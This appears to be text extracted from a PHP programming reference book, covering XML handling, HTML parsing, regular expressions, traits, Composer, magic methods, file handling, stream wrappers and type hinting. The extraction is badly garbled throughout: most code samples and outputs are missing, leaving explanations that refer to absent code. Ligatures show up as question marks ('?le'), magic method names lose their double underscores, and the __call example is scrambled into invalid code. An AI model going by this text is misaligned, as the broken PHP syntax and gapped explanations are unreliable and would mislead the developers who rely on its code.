$dom = new DOMDocument('1.0', 'utf-8');
$dom->preserveWhiteSpace = false;
$dom->formatOutput = true;

//create the main tags, without values
$books = $dom->createElement('books');
$book_1 = $dom->createElement('book');

// create some tags with values
$name_1 = $dom->createElement('name', 'PHP - An Introduction');
$price_1 = $dom->createElement('price', '$5.95');
$id_1 = $dom->createElement('id', '1');

//create	and append an attribute
$attr_1 = $dom->createAttribute('version');
$attr_1->value = '1.0';
//append the attribute
$id_1->appendChild($attr_1);

//create the second tag book with different namespace
$namespace = 'www.example.com/libraryns/1.0';

//include the namespace prefix in the books tag
$books->setAttributeNS('http://www.w3.org/2000/xmlns/', 'xmlns:ns', $namespace);
$book_2 = $dom->createElementNS($namespace,'ns:book');
$name_2 = $dom->createElementNS($namespace, 'ns:name');

//create a CDATA section (that is another DOMNode instance) and put it inside the name tag
$name_cdata = $dom->createCDATASection('PHP - Advanced');
$name_2->appendChild($name_cdata);
$price_2 = $dom->createElementNS($namespace, 'ns:price', '$25.00');
$id_2 = $dom->createElementNS($namespace, 'ns:id', '2');

//create the XML structure
$books->appendChild($book_1);
$book_1->appendChild($name_1);
$book_1->appendChild($price_1);
$book_1->appendChild($id_1);
$books->appendChild($book_2);
$book_2->appendChild($name_2);
$book_2->appendChild($price_2);
$book_2->appendChild($id_2);

$dom->appendChild($books);

//saveXML() method returns the XML in a String
print_r ($dom->saveXML());

This will output the following XML:



Section 36.2: Read a XML document with DOMDocument
Similarly to the SimpleXML, you can use DOMDocument to parse XML from a string or from a XML ?le

1. From a string


2. From a ?le


Example of parsing

Considering the following XML:


This is a example code to parse it


This will output:

The title of the book 1 is PHP - An Introduction and it costs $5.95. The title of the book 2 is PHP - Advanced and it costs $25.00.
Section 36.3: Leveraging XML with PHP's SimpleXML Library
SimpleXML is a powerful library which converts XML strings to an easy to use PHP object. The following assumes an XML structure as below.


Read our data in to SimpleXML

To get started, we need to read our data into SimpleXML. We can do this in 3 di?erent ways. Firstly, we can load our data from a DOM node.


Our next option is to load our data from an XML ?le.


Lastly, we can load our data from a variable.


Whether you've picked to load from a DOM Element, from a ?le or from a string, you are now left with a SimpleXMLElement variable called $xmlElement. Now, we can start to make use of our XML in PHP.
Accessing our SimpleXML Data

The simplest way to access data in our SimpleXMLElement object is to call the properties directly. If we want to access our ?rst bookName, StackOverflow SimpleXML Example, then we can access it as per below.


At this point, SimpleXML will assume that because we have not told it explicitly which book we want, that we want the ?rst one. However, if we decide that we do not want the ?rst one, rather that we want Another SimpleXML Example, then we can access it as per below.


It is worth noting that using [0] works the same as not using it, so


works the same as


Looping through our XML

There are many reasons you may wish to loop through XML, such as that you have a number of items, books in our case, that we would like to display on a webpage. For this, we can use a foreach loop or a standard for loop, taking advantage of SimpleXMLElement's count function..


or


Handling Errors

Now we have come so far, it is important to realise that we are only humans, and will likely encounter an error eventually - especially if we are playing with di?erent XML ?les all the time. And so, we will want to handle those errors.
Consider we created an XML ?le. You will notice that while this XML is much alike what we had earlier, the problem with this XML ?le is that the ?nal closing tag is /doc instead of /document.




Now, say, we load this into our PHP as $?le.


We will be greeted with the following


However as soon as we ?x this problem, we are presented with "Happy Days".

Section 36.4: Create an XML ?le using XMLWriter
Instantiate a XMLWriter object:


Next open the ?le to which you want to write. For example, to write to /var/www/example.com/xml/output.xml, use:


To start the document (create the XML open tag):


This will output:


Now you can start writing elements:


This will generate the XML:


If you need something a little more complex than simply nodes with plain values, you can also "start" an element and add attributes to it before closing it:


This will output:


Section 36.5: Read a XML document with SimpleXML
You can parse XML from a string or from a XML ?le

1. From a string


2. From a ?le


Example of parsing

Considering the following XML:


This is a example code to parse it



This will output:

The title of the book 1 is PHP - An Introduction and it costs $5.95. The title of the book 2 is PHP - Advanced and it costs $25.00.

Chapter 37: SimpleXML
Section 37.1: Loading XML data into simplexml
Loading from string

Use simplexml_load_string to create a SimpleXMLElement from a string:


Note that or not || must be used here because the precedence of or is higher than =. The code after or will only be executed if $xml ?nally resolves to false.

Loading from ?le

Use simplexml_load_file to load XML data from a ?le or a URL:


The URL can be of any schemes that PHP supports, or custom stream wrappers.

Chapter 38: Parsing HTML
Section 38.1: Parsing HTML from a string
PHP implements a DOM Level 2 compliant parser, allowing you to work with HTML using familiar methods like
getElementById() or appendChild().


Outputs:


Note that PHP will emit warnings about any problems with the HTML, especially if you are importing a document fragment. To avoid these warnings, tell the DOM library (libxml) to handle its own errors by calling libxml_use_internal_errors() before importing your HTML. You can then use libxml_get_errors() to handle errors if needed.
Section 38.2: Using XPath


Outputs:


Section 38.3: SimpleXML
Presentation

SimpleXML is a PHP library which provides an easy way to work with XML documents (especially reading and iterating through XML data).
The only restraint is that the XML document must be well-formed.

Parsing XML using procedural approach


Parsing XML using OOP approach
Accessing Children and Attributes

When SimpleXML parses an XML document, it converts all its XML elements, or nodes, to properties of the resulting SimpleXMLElement object
In addition, it converts XML attributes to an associative array that may be accessed from the property to which they belong.
When you know their names:

The major drawback of this approach is that it is necessary to know the names of every element and attribute in the XML document.
When you don't know their names (or you don't want to know them):

Chapter 39: Regular Expressions (regexp/PCRE)
Parameter	Details
$pattern a string with a regular expression (PCRE pattern)

Section 39.1: Global RegExp match
A global RegExp match can be performed using preg_match_all. preg_match_all returns all matching results in the subject string (in contrast to preg_match, which only returns the ?rst one).
The preg_match_all function returns the number of matches. Third parameter $matches will contain matches in format controlled by ?ags that can be given in fourth parameter.

If given an array, $matches will contain array in similar format you'd get with preg_match, except that preg_match stops at ?rst match, where preg_match_all iterates over the string until the string is wholly consumed and returns result of each iteration in a multidimensional array, which format can be controlled by the ?ag in fourth argument.

The fourth argument, $flags, controls structure of $matches array. Default mode is PREG_PATTERN_ORDER and possible ?ags are PREG_SET_ORDER and PREG_PATTERN_ORDER.
Following code demonstrates usage of preg_match_all:


The ?rst var_dump from PREG_SET_ORDER gives this output:




$matches has three nested arrays. Each array represents one match, which has the same format as the return result of preg_match.
The second var_dump (PREG_PATTERN_ORDER) gives this output:


When the same regexp is run through preg_match, following array is returned:


Section 39.2: String matching with regular expressions
preg_match checks whether a string matches the regular expression.


If you pass in a third parameter, it will be populated with the matching data of the regular expression:


$matches contains an array of the whole match then substrings in the regular expression bounded by parentheses, in the order of open parenthesis's o?set. That means, if you have /z(a(b))/ as the regular expression, index 0 contains the whole substring zab, index 1 contains the substring bounded by the outer parentheses ab and index 2

contains the inner parentheses b.
Section 39.3: Split string into array by a regular expression


Output:


To split a string into a array simply pass the string and a regexp for preg_split(); to match and search, adding a third parameter (limit) allows you to set the number of "matches" to perform, the remaining string will be added to the end of the array.

The fourth parameter is (flags) here we use the PREG_SPLIT_NO_EMPTY which prevents our array from containing any empty keys / values.
Section 39.4: String replacing with regular expression


Outputs


Searches for everything between semicolons and reverses the order.

Section 39.5: String replace with callback
preg_replace_callback works by sending every matched capturing group to the de?ned callback and replaces it with the return value of the callback. This allows us to replace strings based on any kind of logic.




Chapter 40: Traits
Section 40.1: What is a Trait?
PHP only allows single inheritance. In other words, a class can only extend one other class. But what if you need to include something that doesn't belong in the parent class? Prior to PHP 5.4 you would have to get creative, but in
5.4 Traits were introduced. Traits allow you to basically "copy and paste" a portion of a class into your main class


So here we have MrEd, which is already extending Horse. But not all horses Talk, so we have a Trait for that. Let's note what this is doing

First, we de?ne our Trait. We can use it with autoloading and Namespaces (see also Referencing a class or function in a namespace). Then we include it into our MrEd class with the keyword use.
You'll note that MrEd takes to using the Talk functions and variables without de?ning them. Remember what we said about copy and paste? These functions and variables are all de?ned within the class now, as if this class had de?ned them.
Traits are most closely related to Abstract classes in that you can de?ne variables and functions. You also cannot instantiate a Trait directly (i.e. new Trait()). Traits cannot force a class to implicitly de?ne a function like an Abstract class or an Interface can. Traits are only for explicit de?nitions (since you can implement as many Interfaces as you want, see Interfaces).

When should I use a Trait?

The ?rst thing you should do, when considering a Trait, is to ask yourself this important question

Can I avoid using a Trait by restructuring my code?


More often than not, the answer is going to be Yes. Traits are edge cases caused by single inheritance. The temptation to misuse or overuse Traits can be high. But consider that a Trait introduces another source for your code, which means there's another layer of complexity. In the example here, we're only dealing with 3 classes. But Traits mean you can now be dealing with far more than that. For each Trait, your class becomes that much harder to deal with, since you must now go reference each Trait to ?nd out what it de?nes (and potentially where a collision happened, see Con?ict Resolution). Ideally, you should keep as few Traits in your code as possible.

Section 40.2: Traits to facilitate horizontal code reuse
Let's say we have an interface for logging:


Now say we have two concrete implementations of the Logger interface: the FileLogger and the ConsoleLogger.


Now if you de?ne some other class Foo which you also want to be able to perform logging tasks, you could do something like this:


Foo is now also a Logger, but its functionality depends on the Logger implementation passed to it via setLogger(). If we now want class Bar to also have this logging mechanism, we would have to duplicate this piece of logic in the Bar class.

Instead of duplicating the code, a trait can be de?ned:


Now that we have de?ned the logic in a trait, we can use the trait to add the logic to the Foo and Bar classes:


And, for example, we can use the Foo class like this:


Section 40.3: Con?ict Resolution
Trying to use several traits into one class could result in issues involving con?icting methods. You need to resolve such con?icts manually.
For example, let's create this hierarchy:


Now, let's try to create the following class:


The php interpreter will return a fatal error:

Fatal error: Trait method say has not been applied, because there are collisions with other trait methods on TalkingParrot

To resolve this con?ict, we could do this:

use keyword insteadof to use the method from one trait instead of method from another trait create an alias for the method with a construct like WoofTrait::say as sayAsDog;


This code will produce the following output:

Meow Woof

Section 40.4: Implementing a Singleton using Traits
Disclaimer: In no way does this example advocate the use of singletons. Singletons are to be used with a lot of care.

In PHP there is quite a standard way of implementing a singleton:


To prevent code duplication, it is a good idea to extract this behaviour into a trait.



Now any class that wants to function as a singleton can simply use the trait:


Even though it is now impossible to serialize a singleton, it is still useful to also disallow the deserialize method.

Section 40.5: Traits to keep classes clean
Over time, our classes may implement more and more interfaces. When these interfaces have many methods, the total number of methods in our class will become very large.
For example, let's suppose that we have two interfaces and a class implementing them:


Instead of implementing all the interface methods inside the Article class, we could use separate Traits to implement these interfaces, keeping the class smaller and separating the code of the interface implementation from the class.
From example, to implement the Printable interface we could create this trait:


and make the class use the trait:


The primary bene?ts would be that our interface-implementation methods will be separated from the rest of the class, and stored in a trait who has the sole responsibility to implement the interface for that particular type of object.
Section 40.6: Multiple Traits Usage


The above example will output:


Section 40.7: Changing Method Visibility




Running this example:


So be aware that in the last example in MyClass2 the original un-aliased method from trait HelloWorld stays accessible as-is.

Chapter 41: Composer Dependency Manager
Parameter	Details
license	De?nes the type of license you want to use in the Project. authors	De?nes the authors of the project, as well as the author details. support	De?nes the support emails, irc channel, and various links. require	De?nes the actual dependencies as well as the package versions. require-dev	De?nes the packages necessary for developing the project.
suggest	De?nes the package suggestions, i.e. packages which can help if installed. autoload	De?nes the autoloading policies of the project.
autoload-dev De?nes the autoloading policies for developing the project.

Composer is PHP's most commonly used dependency manager. It's analogous to npm in Node, pip for Python, or
NuGet for .NET.
Section 41.1: What is Composer?
Composer is a dependency/package manager for PHP. It can be used to install, keep track of, and update your project dependencies. Composer also takes care of autoloading the dependencies that your application relies on, letting you easily use the dependency inside your project without worrying about including them at the top of any given ?le.
Dependencies for your project are listed within a composer.json ?le which is typically located in your project root. This ?le holds information about the required versions of packages for production and also development.

A full outline of the composer.json schema can be found on the Composer Website.

This ?le can be edited manually using any text-editor or automatically through the command line via commands such as composer require <package> or composer require-dev <package>.
To start using composer in your project, you will need to create the composer.json ?le. You can either create it manually or simply run composer init. After you run composer init in your terminal, it will ask you for some basic information about your project: Package name (vendor/package - e.g. laravel/laravel), Description - optional, Author and some other information like Minimum Stability, License and Required Packages.

The require key in your composer.json ?le speci?es Composer which packages your project depends on. require
takes an object that maps package names (e.g. monolog/monolog) to version constraints (e.g. 1.0.*).


To install the de?ned dependencies, you will need to run the composer install command and it will then ?nd the de?ned packages that matches the supplied version constraint and download it into the vendor directory. It's a convention to put third party code into a directory named vendor.

You will notice the install command also created a composer.lock ?le.

A composer.lock ?le is automatically generated by Composer. This ?le is used to track the currently installed

versions and state of your dependencies. Running composer install will install packages to exactly the state stored in the lock ?le.
Section 41.2: Autoloading with Composer
While composer provides a system to manage dependencies for PHP projects (e.g. from Packagist), it can also notably serve as an autoloader, specifying where to look for speci?c namespaces or include generic function ?les.
It starts with the composer.json ?le:


This con?guration code ensures that all classes in the namespace MyVendorName\MyProject are mapped to the src directory and all classes in MyVendorName\MyProject\Tests to the tests directory (relative to your root directory). It will also automatically include the ?le functions.php.

After putting this in your composer.json ?le, run composer update in a terminal to have composer update the dependencies, the lock ?le and generate the autoload.php ?le. When deploying to a production environment you would use composer install --no-dev. The autoload.php ?le can be found in the vendor directory which should be generated in the directory where composer.json resides.

You should require this ?le early at a setup point in the lifecycle of your application using a line similar to that below.


Once included, the autoload.php ?le takes care of loading all the dependencies that you provided in your
composer.json ?le.

Some examples of the class path to directory mapping:

MyVendorName\MyProject\Shapes\Square ? src/Shapes/Square.php. MyVendorName\MyProject\Tests\Shapes\Square ? tests/Shapes/Square.php.

Section 41.3: Di?erence between 'composer install' and 'composer update'

composer update

composer update will update our dependencies as they are speci?ed in composer.json.

For example, if our project uses this con?guration:


Supposing we have actually installed the 2.0.1 version of the package, running composer update will cause an upgrade of this package (for example to 2.0.2, if it has already been released).
In detail composer update will:

Read composer.json
Remove installed packages that are no more required in composer.json Check the availability of the latest versions of our required packages Install the latest versions of our packages
Update composer.lock to store the installed packages version
composer install

composer install will install all of the dependencies as speci?ed in the composer.lock ?le at the version speci?ed (locked), without updating anything.

In detail:

Read composer.lock ?le
Install the packages speci?ed in the composer.lock ?le
When to install and when to update

composer update is mostly used in the 'development' phase, to upgrade our project packages.
composer install is primarily used in the 'deploying phase' to install our application on a production server or on a testing environment, using the same dependencies stored in the composer.lock ?le created by composer update.

Section 41.4: Composer Available Commands
Command	Usage
about	Short information about Composer
archive	Create an archive of this composer package
browse	Opens the package's repository URL or homepage in your browser. clear-cache	Clears composer's internal package cache.
clearcache	Clears composer's internal package cache. con?g	Set con?g options
create-project	Create new project from a package into given directory. depends	Shows which packages cause the given package to be installed diagnose	Diagnoses the system to identify common errors.
dump-autoload Dumps the autoloader dumpautoload Dumps the autoloader
exec	Execute a vendored binary/script
global	Allows running commands in the global composer dir ($COMPOSER_HOME). help	Displays help for a command
home	Opens the package's repository URL or homepage in your browser.

info	Show information about packages
init	Creates a basic composer.json ?le in current directory.
Installs the project dependencies from the composer.lock ?le if present, or falls back on the composer.json.
licenses	Show information about licenses of dependencies list	Lists commands
outdated	Shows a list of installed packages that have updates available, including their latest version. prohibits	Shows which packages prevent the given package from being installed
remove	Removes a package from the require or require-dev
require	Adds required packages to your composer.json and installs them run-script	Run the scripts de?ned in composer.json.
search	Search for packages
self-update  Updates composer.phar to the latest version. selfupdate  Updates composer.phar to the latest version. show	Show information about packages
status	Show a list of locally modi?ed packages suggests	Show package suggestions
Updates your dependencies to the latest version according to composer.json, and updates the composer.lock ?le.
validate	Validates a composer.json and composer.lock
why	Shows which packages cause the given package to be installed
why-not	Shows which packages prevent the given package from being installed

Section 41.5: Bene?ts of Using Composer
Composer tracks which versions of packages you have installed in a ?le called composer.lock, which is intended to be committed to version control, so that when the project is cloned in the future, simply running composer install will download and install all the project's dependencies.

Composer deals with PHP dependencies on a per-project basis. This makes it easy to have several projects on one machine that depend on separate versions of one PHP package.
Composer tracks which dependencies are only intended for dev environments only


Composer provides an autoloader, making it extremely easy to get started with any package. For instance, after installing Goutte with composer require fabpot/goutte, you can immediately start to use Goutte in a new project:


Composer allows you to easily update a project to the latest version that is allowed by your composer.json. EG.
composer update fabpot/goutte, or to update each of your project's dependencies: composer update.

Section 41.6: Installation
You may install Composer locally, as part of your project, or globally as a system wide executable.

Locally

To install, run these commands in your terminal.


This will download composer.phar (a PHP Archive ?le) to the current directory. Now you can run php composer.phar to use Composer, e.g.

Globally

To use Composer globally, place the composer.phar ?le to a directory that is part of your PATH


Now you can use composer anywhere instead of php composer.phar, e.g.


Chapter 42: Magic Methods


Section 42.1:

	call() and

	callStatic()


 call() and  callStatic() are called when somebody is calling nonexistent object method in object or static context.

class Foo
{
/**
* This method will be called when somebody will try to invoke a method in object
* context, which does not exist, like:
* 
* $foo->method($arg, $arg1);
* 
* First argument will contain the method name(in example above it will be "method"),
* and the second will contain the values of $arg and $arg1 as an array.
*/

public function
{

 call($method, $arguments)

// do something with that information here, like overloading
// or something generic.
// For sake of example let's say we're making a generic class,
// that holds some data and allows user to get/set/has via
// getter/setter methods. Also let's assume that there is some
// CaseHelper which helps to convert camelCase into snake_case.
// Also this method is simplified, so it does not check if there
// is a valid name or
$snakeName = CaseHelper::camelToSnake($method);
// Get get/set/has prefix
$subMethod = substr($snakeName, 0, 3);

// Drop method name.
$propertyName = substr($snakeName, 4);

switch ($subMethod) { case "get":
     return $this->data[$propertyName]; case "set":
$this->data[$propertyName] = $arguments[0]; break;
case "has":
     return isset($this->data[$propertyName]); default:
throw new BadMethodCallException("Undefined method $method");
}
}

/**
*   callStatic will be called from static content, that is, when calling a nonexistent
* static  method:
* 
* Foo::buildSomethingCool($arg);
* 
* First argument will contain the method name(in example above it will be "buildSomethingCool"),
* and the second will contain the value $arg in an array.
* 
* Note that signature of this method is different(requires static keyword). This method was not
* available prior PHP 5.3
*/



Example:


Section 42.2:

	get(),

	set(),

	isset() and

	unset()


Whenever you attempt to retrieve a certain ?eld from a class like so:


PHP invokes the magic method  get($name), with $name equal to "height" in this case. Writing to a class ?eld like so:


Will invoke the magic method   set($name, $value), with $name equal to "height" and $value equal to 10.

PHP also has two built-in functions isset(), which check if a variable exists, and unset(), which destroys a variable. Checking whether a objects ?eld is set like so:


Will invoke the  isset($name) function on that object. Destroying a variable like so:


Will invoke the  unset($name) function on that object.

Normally, when you don't de?ne these methods on your class, PHP just retrieves the ?eld as it is stored in your class. However, you can override these methods to create classes that can hold data like an array, but are usable like an object:




empty() function and magic methods

Note that calling empty() on a class attribute will invoke  isset() because as the PHP manual states:

empty() is essentially the concise equivalent to !isset($var) || $var == false


Section 42.3:

	construct() and

	destruct()


 construct() is the most common magic method in PHP, because it is used to set up a class when it is initialized. The opposite of the  construct() method is the  destruct() method. This method is called when there are no more references to an object that you created or when you force its deletion. PHP's garbage collection will clean up the object by ?rst calling its destructor and then removing it from memory.


public function  construct($width, $height) {
parent:: construct();

$this->width = $width;
$this->height = $height;
echo "Created {$this->width}x{$this->height} Rectangle\n";
}

public function  destruct() {
echo "Destroying {$this->width}x{$this->height} Rectangle\n";
}
}

function createRectangle() {
// Instantiating an object will call the constructor with the specified arguments
$rectangle = new Rectangle(20, 50);

// 'Shape Created' will be printed
// 'Created 20x50 Rectangle' will be printed
}

createRectangle();
// 'Destroying 20x50 Rectangle' will be printed, because
// the `$rectangle` object was local to the createRectangle function, so
// When the function scope is exited, the object is destroyed and its
// destructor is called.

// The destructor of an object is also called when unset is used:
unset(new Rectangle(20, 50));

Section 42.4: 	toString()

Whenever an object is treated as a string, the  toString() method is called. This method should return a string representation of the class.


Section 42.5: 	clone()

 clone is invoked by use of the clone keyword. It is used to manipulate object state upon cloning, after the object has been actually cloned.


Example:


Section 42.6: 	invoke()

This magic method is called when user tries to invoke object as a function. Possible use cases may include some approaches like functional programming or some callbacks.





Section 42.7:

	sleep() and

	wakeup()


 sleep and  wakeup are methods that are related to the serialization process. serialize function checks if a class has a  sleep method. If so, it will be executed before any serialization.  sleep is supposed to return an array of the names of all variables of an object that should be serialized.

 wakeup in turn will be executed by unserialize if it is present in class. It's intention is to re-establish resources and other things that are needed to be initialized upon unserialization.


Section 42.8: 	debugInfo()

This method is called by var_dump() when dumping an object to get the properties that should be shown. If the method isn't de?ned on an object, then all public, protected and private properties will be shown.
- PHP Manual


Version = 5.6


The above example will output:

Version = 5.6


The above example will output:


Chapter 43: File handling
Parameter	Description
?lename	The ?lename being read.
You can use the optional second parameter and set it to TRUE, if you want to search for the ?le in the include_path, too.
context	A context stream resource.

Section 43.1: Convenience functions
Raw direct IO

file_get_contents and file_put_contents provide the ability to read/write from/to a ?le to/from a PHP string in a single call.

file_put_contents can also be used with the FILE_APPEND bitmask ?ag to append to, instead of truncate and overwrite, the ?le. It can be used along with LOCK_EX bitmask to acquire an exclusive lock to the ?le while proceeding to writing. Bitmask ?ags can be joined with the | bitwise-OR operator.


FILE_APPEND is handy for appending to log ?les while LOCK_EX helps prevent race condition of ?le writing from multiple processes. For example, to write to a log ?le about the current session:

CSV IO


The fgetcsv parses line from open ?le checking for csv ?elds. It returns CSV ?elds in an array on success or FALSE
on failure.

By default, it will read only one line of the CSV ?le.


contacts.csv


Output:



Reading a ?le to stdout directly

readfile copies a ?le to the output bu?er. read?le() will not present any memory issues, even when sending large ?les, on its own.


Or from a ?le pointer

Alternatively, to seek a point in the ?le to start copying to stdout, use fpassthru instead. In the following example, the last 1024 bytes are copied to stdout:

Reading a ?le into an array

file returns the lines in the passed ?le in an array. Each element of the array corresponds to a line in the ?le, with the newline still attached.


test.txt


Output:


Section 43.2: Deleting ?les and directories
Deleting ?les

The unlink function deletes a single ?le and returns whether the operation was successful.

Deleting directories, with recursive deletion

On the other hand, directories should be deleted with rmdir. However, this function only deletes empty directories. To delete a directory with ?les, delete the ?les in the directories ?rst. If the directory contains subdirectories, recursion may be needed.
The following example scans ?les in a directory, deletes member ?les/directories recursively, and returns the number of ?les (not directories) deleted.


Section 43.3: Getting ?le information
Check if a path is a directory or a ?le

The is_dir function returns whether the argument is a directory, while is_file returns whether the argument is a ?le. Use file_exists to check if it is either.




This gives:

Checking ?le type

Use filetype to check the type of a ?le, which may be:

fifo char dir block link file socket unknown

Passing the ?lename to the filetype directly:


Note that filetype returns false and triggers an E_WARNING if the ?le doesn't exist.

Checking readability and writability

Passing the ?lename to the is_writable and is_readable functions check whether the ?le is writable or readable respectively.

The functions return false gracefully if the ?le does not exist.

Checking ?le access/modify time

Using filemtime and fileatime returns the timestamp of the last modi?cation or access of the ?le. The return value is a Unix timestamp -- see Working with Dates and Time for details.

Get path parts with ?leinfo




This example will output:


Which can be used as:

Parameter	Details
$path	The full path of the ?le to be parsed
One of four available options [PATHINFO_DIRNAME, PATHINFO_BASENAME, PATHINFO_EXTENSION or PATHINFO_FILENAME]

If an option (the second parameter) is not passed, an associative array is returned otherwise a string is returned.
Does not validate that the ?le exists.
Simply parses the string into parts. No validation is done on the ?le (no mime-type checking, etc.)
The extension is simply the last extension of $path The path for the ?le image.jpg.png would be .png even if it technically a .jpg ?le. A ?le without an extension will not return an extension element in the array.
Section 43.4: Stream-based ?le IO
Opening a stream

fopen opens a ?le stream handle, which can be used with various functions for reading, writing, seeking and other functions on top of it. This value is of resource type, and cannot be passed to other threads persisting its functionality.


The second parameter is the mode of the ?le stream:

Mode Description
r Open in read only mode, starting at the beginning of the ?le
r+ Open for reading and writing, starting at the beginning of the ?le
w open for writing only, starting at the beginning of the ?le. If the ?le exists it will empty the ?le. If it doesn't exist it will attempt to create it.
w+ open for reading and writing, starting at the beginning of the ?le. If the ?le exists it will empty the ?le. If it doesn't exist it will attempt to create it.
a open a ?le for writing only, starting at the end of the ?le. If the ?le does not exist, it will try to create it
a+ open a ?le for reading and writing, starting at the end of the ?le. If the ?le does not exist, it will try to create it

x create and open a ?le for writing only. If the ?le exists the fopen call will fail
x+ create and open a ?le for reading and writing. If the ?le exists the fopen call will fail
c open the ?le for writing only. If the ?le does not exist it will try to create it. It will start writing at the beginning of the ?le, but will not empty the ?le ahead of writing
c+ open the ?le for reading and writing. If the ?le does not exist it will try to create it. It will start writing at the beginning of the ?le, but will not empty the ?le ahead of writing

Adding a t behind the mode (e.g. a+b, wt, etc.) in Windows will translate "\n" line endings to "\r\n" when working with the ?le. Add b behind the mode if this is not intended, especially if it is a binary ?le.
The PHP application should close streams using fclose when they are no longer used to prevent the Too many open files error. This is particularly important in CLI programs, since the streams are only closed when the runtime shuts down -- this means that in web servers, it may not be necessary (but still should, as a practice to prevent resource leak) to close the streams if you do not expect the process to run for a long time, and will not open many streams.

Reading

Using fread will read the given number of bytes from the ?le pointer, or until an EOF is met.

Reading lines

Using fgets will read the ?le until an EOL is reached, or the given length is read. Both fread and fgets will move the ?le pointer while reading.
Reading everything remaining

Using stream_get_contents will all remaining bytes in the stream into a string and return it.

Adjusting ?le pointer position

Initially after opening the stream, the ?le pointer is at the beginning of the ?le (or the end, if the mode a is used). Using the fseek function will move the ?le pointer to a new position, relative to one of three values:
SEEK_SET: This is the default value; the ?le position o?set will be relative to the beginning of the ?le.
SEEK_CUR: The ?le position o?set will be relative to the current position.
SEEK_END: The ?le position o?set will be relative to the end of the ?le. Passing a negative o?set is the most common use for this value; it will move the ?le position to the speci?ed number of bytes before the end of ?le.
rewind is a convenience shortcut of fseek($fh, 0, SEEK_SET). Using ftell will show the absolute position of the ?le pointer.
For example, the following script reads skips the ?rst 10 bytes, reads the next 10 bytes, skips 10 bytes, reads the next 10 bytes, and then the last 10 bytes in ?le.txt:



Writing

Using fwrite writes the provided string to the ?le starting at the current ?le pointer.


Section 43.5: Moving and Copying ?les and directories
Copying ?les

copy copies the source ?le in the ?rst argument to the destination in the second argument. The resolved destination needs to be in a directory that is already created.

Copying directories, with recursion

Copying directories is pretty much similar to deleting directories, except that for ?les copy instead of unlink is used, while for directories, mkdir instead of rmdir is used, at the beginning instead of being at the end of the function.

Renaming/Moving

Renaming/Moving ?les and directories is much simpler. Whole directories can be moved or renamed in a single call, using the rename function.

rename("~/file.txt", "~/file.html");

rename("~/dir", "~/old_dir");

rename("~/dir/file.txt", "~/dir2/file.txt");


Section 43.6: Minimize memory usage when dealing with large ?les
If we need to parse a large ?le, e.g. a CSV more than 10 Mbytes containing millions of rows, some use file or
file_get_contents functions and end up with hitting memory_limit setting with

Allowed memory size of XXXXX bytes exhausted


error. Consider the following source (top-1m.csv has exactly 1 million rows and is about 22 Mbytes of size)


This outputs:


because the interpreter needed to hold all the rows in $arr array, so it consumed ~200 Mbytes of RAM. Note that we haven't even done anything with the contents of the array.

Now consider the following code:


which outputs


so we don't use a single extra byte of memory, but parse the whole CSV and save it to another ?le reversing the value of the 2nd column. That's because fgetcsv reads only one row and $row is overwritten in every loop.

Chapter 44: Streams
Parameter Name	Description
Stream Resource  The data provider consisting of the <scheme>://<target> syntax

Section 44.1: Registering a stream wrapper
A stream wrapper provides a handler for one or more speci?c schemes.

The example below shows a simple stream wrapper that sends PATCH HTTP requests when the stream is closed.

// register the FooWrapper class as a wrapper for foo:// URLs.
stream_wrapper_register("foo", FooWrapper::class, STREAM_IS_URL) or die("Duplicate stream wrapper registered");

class FooWrapper {
// this will be modified by PHP to show the context passed in the current call.
public $context;

// this is used in this example internally to store the URL
private $url;

    // when fopen() with a protocol for this wrapper is called, this method can be implemented to store data like the host.
     public function stream_open(string $path, string $mode, int $options, string &$openedPath) : bool {
$url = parse_url($path);
if($url === false) return false;
$this->url = $url["host"] . "/" . $url["path"]; return true;
}

// handles calls to fwrite() on this stream
public function stream_write(string $data) : int {
$this->buffer .= $data; return strlen($data);
}

// handles calls to fclose() on this stream
public function stream_close() {
$curl = curl_init("http://" . $this->url); curl_setopt($curl, CURLOPT_POSTFIELDS, $this->buffer); curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "PATCH"); curl_exec($curl);
curl_close($curl);
$this->buffer = "";
}

// fallback exception handler if an unsupported operation is attempted.
// this is not necessary.
public function  call($name, $args) {
throw new \RuntimeException("This wrapper does not support $name");
}

// this is called when unlink("foo://something-else") is called.
public function unlink(string $path) {
$url = parse_url($path);
$curl = curl_init("http://" . $url["host"] . "/" . $url["path"]); curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "DELETE");



This example only shows some examples of what a generic stream wrapper would contain. These are not all methods available. A full list of methods that can be implemented can be found at http://php.net/streamWrapper.

Chapter 45: Type hinting
Section 45.1: Type hinting classes and interfaces
Type hinting for classes and interfaces was added in PHP 5.

Class type hint

The above script outputs:

Chris is being enrolled at University of Edinburgh



Interface type hint



The above example outputs the same as before:

Chris is being enrolled at University of Edinburgh


Self type hints

The self keyword can be used as a type hint to indicate that the value must be an instance of the class that declares the method.
Section 45.2: Type hinting scalar types, arrays and callables
Support for type hinting array parameters (and return values after PHP 7.1) was added in PHP 5.1 with the keyword
array. Any arrays of any dimensions and types, as well as empty arrays, are valid values.

Support for type hinting callables was added in PHP 5.4. Any value that is_callable() is valid for parameters and return values hinted callable, i.e. Closure objects, function name strings and array(class_name|object, method_name).

If a typo occurs in the function name such that it is not is_callable(), a less obvious error message would be displayed:

Fatal error: Uncaught TypeError: Argument 1 passed to foo() must be of the type callable, string/array given



Nonstatic methods can also be passed as callables in static format, resulting in a deprecation warning and level E_STRICT error in PHP 7 and 5 respectively.
Method visibility is taken into account. If the context of the method with the callable parameter does not have access to the callable provided, it will end up as if the method does not exist.




Output:

Fatal error: Uncaught TypeError: Argument 1 passed to r() must be callable, array given


Support for type hinting scalar types was added in PHP 7. This means that we gain type hinting support for
booleans, integers, floats and strings.


By default, PHP will attempt to cast any provided argument to match its type hint. Changing the call to add(1.5, 2)
gives exactly the same output, since the ?oat 1.5 was cast to int by PHP.

To stop this behavior, one must add declare(strict_types=1); to the top of every PHP source ?le that requires it.


The above script now produces a fatal error:

Fatal error: Uncaught TypeError: Argument 1 passed to add() must be of the type integer, ?oat given


An Exception: Special Types

Some PHP functions may return a value of type resource. Since this is not a scalar type, but a special type, it is not possible to type hint it.

As an example, curl_init() will return a resource, as well as fopen(). Of course, those two resources aren't compatible to each other. Because of that, PHP 7 will always throw the following TypeError when type hinting resource explicitly:

TypeError: Argument 1 passed to sample() must be an instance of resource, resource given

Section 45.3: Nullable type hints
Parameters

Nullable type hint was added in PHP 7.1 using the ? operator before the type hint.



Before PHP 7.1, if a parameter has a type hint, it must declare a default value null to accept null values.

Return values

In PHP 7.0, functions with a return type must not return null.

